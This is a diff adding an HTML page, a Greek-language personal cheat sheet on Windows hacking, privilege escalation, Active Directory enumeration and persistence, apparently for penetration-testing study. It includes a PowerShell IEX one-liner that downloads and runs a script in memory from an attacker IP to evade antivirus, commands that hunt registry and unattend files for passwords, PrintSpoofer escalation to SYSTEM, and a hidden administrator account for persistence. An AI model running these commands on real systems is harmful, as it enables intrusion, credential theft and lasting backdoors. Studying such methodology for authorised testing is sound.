@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Hacking & PrivEsc | Personal Cyber Book</title>
+    <link rel="stylesheet" href="windows.css">
+</head>
+<body>
+
+    <!-- SIDEBAR NAVIGATION -->
+    <nav>
+        <div id="back-home-container">
+            <a id="back-home-btn" href="index.html">
+                🏠 Αρχική Σελίδα
+            </a>
+        </div>
+
+        <h1>🪟 Windows Book</h1>
+        <ul>
+            <li><a href="#smb-enum" class="nav-enum">1. SMB Enumeration</a></li>
+            <li><a href="#win-recon" class="nav-nmap">2. Host Reconnaissance</a></li>
+            <li><a href="#file-transfers" class="nav-gobuster">3. File Transfers</a></li>
+            <li><a href="#local-looting" class="nav-john">4. Local Looting & Passwords</a></li>
+            <li><a href="#privesc" class="nav-linpeas">5. Privilege Escalation</a></li>
+            <li><a href="#active-directory" class="nav-impacket">6. Active Directory Basics</a></li>
+            <li><a href="#post-exploit" class="nav-hydra">7. Post-Exploitation</a></li>
+        </ul>
+    </nav>
+
+    <!-- MAIN CONTENT -->
+    <main>
+        <header>
+            <h2>Οδηγός Windows Hacking & Privilege Escalation</h2>
+            <p>Μεθοδολογία, εντολές enumeration, token impersonation και Active Directory επιθέσεις.</p>
+        </header>
+
+        <!-- ==================== SECTION: SMB ENUMERATION ==================== -->
+        <section id="smb-enum">
+            <h3 class="tool-title enum4linux-title">📁 1. SMB Enumeration & Authentication</h3>
+            
+            <div class="info-box enum-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το SMB (Θύρες 139/445) είναι η πιο κοινή πύλη εισόδου σε περιβάλλοντα Windows. Το χρησιμοποιούμε για να βρούμε κοινόχρηστους φακέλους (Shares) με δικαιώματα ανάγνωσης/εγγραφής ή για να ελέγξουμε εγκυρότητα διαπιστευτηρίων.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Απαρίθμηση Shares (Anonymous)</div>
+                        <span class="category-tag tag-enum">SMBClient</span>
+                    </div>
+                    <div class="card-desc">Ελέγχει ποιοι φάκελοι είναι προσβάσιμοι χωρίς κωδικό πρόσβασης (Null Session).</div>
+                    <div class="code-block">smbclient -L //<span>[TARGET_IP]</span> -N</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Σύνδεση σε Συγκεκριμένο Share</div>
+                        <span class="category-tag tag-enum">SMBClient</span>
+                    </div>
+                    <div class="card-desc">Σύνδεση σε ένα share χρησιμοποιώντας συγκεκριμένο όνομα χρήστη και κωδικό.</div>
+                    <div class="code-block">smbclient //<span>[TARGET_IP]</span>/<span>[SHARE_NAME]</span> -U '<span>[USER]</span>%<span>[PASSWORD]</span>'</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος Διαπιστευτηρίων στο Δίκτυο</div>
+                        <span class="category-tag tag-hydra">CrackMapExec</span>
+                    </div>
+                    <div class="card-desc">Ελέγχει αν ένας κωδικός είναι έγκυρος και αν ο χρήστης είναι Administrator (Εμφανίζει Pwn3d!).</div>
+                    <div class="code-block">crackmapexec smb <span>[TARGET_IP]</span> -u '<span>[USER]</span>' -p '<span>[PASSWORD]</span>'</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION: WINDOWS RECON ==================== -->
+        <section id="win-recon">
+            <h3 class="tool-title nmap-title">🔍 2. Windows Host Reconnaissance (Internal)</h3>
+            
+            <div class="info-box nmap-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Μόλις αποκτήσουμε το πρώτο μας shell (π.χ. ως Network Service ή απλός χρήστης), πρέπει να καταλάβουμε την αρχιτεκτονική του συστήματος, την έκδοση του OS και τα δικαιώματά μας.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος Αρχιτεκτονικής Συστήματος</div>
+                        <span class="category-tag tag-nmap">CMD</span>
+                    </div>
+                    <div class="card-desc">Επιστρέφει αν το λειτουργικό σύστημα είναι 32-bit ή 64-bit (Κρίσιμο για επιλογή exploits).</div>
+                    <div class="code-block">wmic os get osarchitecture</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Πληροφορίες Συστήματος & OS Build</div>
+                        <span class="category-tag tag-nmap">CMD</span>
+                    </div>
+                    <div class="card-desc">Εμφανίζει την ακριβή έκδοση των Windows, Hotfixes και Network Cards.</div>
+                    <div class="code-block">systeminfo</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος Ειδικών Προνομίων (Privileges)</div>
+                        <span class="category-tag tag-linpeas">CMD</span>
+                    </div>
+                    <div class="card-desc">Η πιο σημαντική εντολή. Δείχνει αν έχουμε δικαιώματα όπως το SeImpersonatePrivilege.</div>
+                    <div class="code-block">whoami /priv</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION: FILE TRANSFERS ==================== -->
+        <section id="file-transfers">
+            <h3 class="tool-title gobuster-title">🚀 3. Αξιόπιστη Μεταφορά Αρχείων (File Transfers)</h3>
+            
+            <div class="info-box gobuster-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Στα Windows δεν υπάρχει η εντολή `wget` του Linux. Χρησιμοποιούμε το PowerShell για να κατεβάσουμε exploits από το δικό μας μηχάνημα επίθεσης.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Κατέβασμα Αρχείου μέσω PowerShell (WebClient)</div>
+                        <span class="category-tag tag-gobuster">PowerShell</span>
+                    </div>
+                    <div class="card-desc">Κατεβάζει ένα αρχείο από τον τοπικό σας Python server και το αποθηκεύει στα Windows.</div>
+                    <div class="code-block">powershell -c "$w = New-Object System.Net.WebClient; $w.DownloadFile('http://<span>[YOUR_IP]</span>/<span>[FILE.EXE]</span>', '<span>[OUTPUT.EXE]</span>')"</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Φόρτωση Script απευθείας στη Μνήμη (In-Memory Execution)</div>
+                        <span class="category-tag tag-gobuster">PowerShell</span>
+                    </div>
+                    <div class="card-desc">Φορτώνει και εκτελεί ένα PowerShell script (.ps1) απευθείας στη μνήμη RAM χωρίς να γραφτεί στον δίσκο (Bypass AV).</div>
+                    <div class="code-block">powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<span>[YOUR_IP]</span>/<span>[SCRIPT.PS1]</span>')"</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION: LOCAL LOOTING ==================== -->
+        <section id="local-looting">
+            <h3 class="tool-title john-title">🔑 4. Local Looting & Passwords Hunting</h3>
+            
+            <div class="info-box john-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Πολλές φορές οι διαχειριστές αφήνουν κωδικούς σε κοινή θέα. Ψάχνουμε στο Registry, σε αρχεία ρυθμίσεων (Unattended installs) ή αποθηκευμένα διαπιστευτήρια του συστήματος.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Αναζήτηση Κωδικών στο Registry</div>
+                        <span class="category-tag tag-john">Registry</span>
+                    </div>
+                    <div class="card-desc">Ψάχνει σε όλο το Registry για κλειδιά που περιέχουν τη λέξη "password".</div>
+                    <div class="code-block">reg query HKLM /f <span>password</span> /t REG_SZ /s</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος για Windows AutoLogon Credentials</div>
+                        <span class="category-tag tag-john">Registry</span>
+                    </div>
+                    <div class="card-desc">Ελέγχει αν έχει ρυθμιστεί αυτόματη είσοδος χρήστη, η οποία αποθηκεύει τον κωδικό σε plain text.</div>
+                    <div class="code-block">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Αναζήτηση Αρχείων Unattend.xml</div>
+                        <span class="category-tag tag-john">CMD</span>
+                    </div>
+                    <div class="card-desc">Αρχεία αυτοματοποιημένης εγκατάστασης που συχνά περιέχουν Base64 ή plain text κωδικούς διαχειριστή.</div>
+                    <div class="code-block">dir /b /s <span>unattend.xml</span></div>
+                </div>
+  <!-- ==================== SECTION: PRIVILEGE ESCALATION ==================== -->
+        <section id="privesc">
+            <h3 class="tool-title linpeas-title">👑 5. Privilege Escalation (Token Impersonation & Services)</h3>
+            
+            <div class="info-box linpeas-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Όταν ο λογαριασμός μας έχει ενεργό το προνόμιο <strong>SeImpersonatePrivilege</strong> ή όταν υπάρχουν κακές ρυθμίσεις σε υπηρεσίες (Weak Service Permissions), ανεβαίνουμε σε SYSTEM.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">PrintSpoofer (Windows Server 2016 / 2019)</div>
+                        <span class="category-tag tag-linpeas">Exploit</span>
+                    </div>
+                    <div class="card-desc">Εκμεταλλεύεται το Spooler service για να ανοίξει ένα νέο CMD παράθυρο ως SYSTEM.</div>
+                    <div class="code-block"><span>PrintSpoofer64.exe</span> -i -c cmd.exe</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος Δικαιωμάτων Υπηρεσιών (Weak Permissions)</div>
+                        <span class="category-tag tag-linpeas">CMD</span>
+                    </div>
+                    <div class="card-desc">Χρησιμοποιεί το accesschk της Sysinternals για να δει αν ο απλός χρήστης μπορεί να τροποποιήσει κάποια υπηρεσία.</div>
+                    <div class="code-block">accesschk.exe -uwcqv "<span>Everyone</span>" *</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION: ACTIVE DIRECTORY ==================== -->
+        <section id="active-directory">
+            <h3 class="tool-title impacket-title">🌐 6. Active Directory Basics & Domain Enumeration</h3>
+            
+            <div class="info-box impacket-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Όταν το μηχάνημα-στόχος ανήκει σε εταιρικό δίκτυο (Domain), πρέπει να συλλέξουμε πληροφορίες για τον Domain Controller, τους χρήστες και τα groups του δικτύου.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Πληροφορίες για το Domain & Password Policy</div>
+                        <span class="category-tag tag-impacket">CMD</span>
+                    </div>
+                    <div class="card-desc">Εμφανίζει το όνομα του Domain και τις ρυθμίσεις κωδικών (π.χ. πότε λήγουν, ελάχιστο μέγεθος).</div>
+                    <div class="code-block">net accounts</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Λίστα Όλων των Χρηστών του Domain</div>
+                        <span class="category-tag tag-impacket">CMD</span>
+                    </div>
+                    <div class="card-desc">Επικοινωνεί με τον Domain Controller και επιστρέφει όλους τους λογαριασμούς χρηστών του δικτύου.</div>
+                    <div class="code-block">net user /domain</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Προβολή των Domain Administrators</div>
+                        <span class="category-tag tag-impacket">CMD</span>
+                    </div>
+                    <div class="card-desc">Εμφανίζει ποιοι χρήστες έχουν τα απόλυτα δικαιώματα διαχειριστή σε όλο το δίκτυο.</div>
+                    <div class="code-block">net group "<span>Domain Admins</span>" /domain</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION: POST EXPLOITATION ==================== -->
+        <section id="post-exploit">
+            <h3 class="tool-title hydra-title">🎯 7. Post-Exploitation & Πίσω Πόρτες (Persistence)</h3>
+            
+            <div class="info-box hydra-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Αφού γίνουμε Administrators/SYSTEM, θέλουμε να εξασφαλίσουμε ότι δεν θα χάσουμε την πρόσβαση αν το μηχάνημα κάνει επανεκκίνηση ή αν κλείσει το shell μας.</p>
+            </div>
+
+            <div class="commands-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Δημιουργία Νέου Χρήστη Διαχειριστή</div>
+                        <span class="category-tag tag-hydra">Persistence</span>
+                    </div>
+                    <div class="card-desc">Προσθέτει έναν κρυφό χρήστη και τον βάζει στο group των τοπικών διαχειριστών.</div>
+                    <div class="code-block">net user <span>[USERNAME]</span> <span>[PASSWORD]</span> /add && net localgroup Administrators <span>[USERNAME]</span> /add</div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Ενεργοποίηση RDP (Remote Desktop)</div>
+                        <span class="category-tag tag-hydra">CMD</span>
+                    </div>
+                    <div class="card-desc">Ενεργοποιεί την απομακρυσμένη επιφάνεια εργασίας μέσω του Registry σε περίπτωση που είναι κλειστή.</div>
+                    <div class="code-block">reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</div>
+                </div>
+            </div>
+        </section>
